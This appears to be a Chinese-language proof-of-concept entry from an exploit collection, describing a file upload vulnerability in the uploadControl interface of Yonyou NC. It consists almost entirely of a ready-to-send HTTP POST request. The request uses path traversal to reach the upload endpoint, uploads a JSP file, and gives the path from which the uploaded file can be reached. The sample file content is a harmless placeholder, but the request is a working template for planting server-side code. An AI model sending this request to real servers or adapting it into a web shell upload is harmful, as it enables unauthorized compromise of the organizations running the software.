## 用友NC-uploadControl接口存在文件上传漏洞


## poc
```
POST /mp/login/../uploadControl/uploadFile HTTP/1.1
Host: 192.168.63.133:8088
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryoDIsCqVMmF83ptmp
Content-Length: 314

------WebKitFormBoundaryoDIsCqVMmF83ptmp
Content-Disposition: form-data; name="file"; filename="test.jsp"
Content-Type: application/octet-stream

111
------WebKitFormBoundaryoDIsCqVMmF83ptmp
Content-Disposition: form-data; name="submit"

上传
------WebKitFormBoundaryoDIsCqVMmF83ptmp
```

![image](https://github.com/wy876/POC/assets/139549762/64e73208-5e7f-4dfe-a3eb-4a56057d6969)

文件路径：`http:127.0.0.1/mp/uploadFileDir/test.jsp`
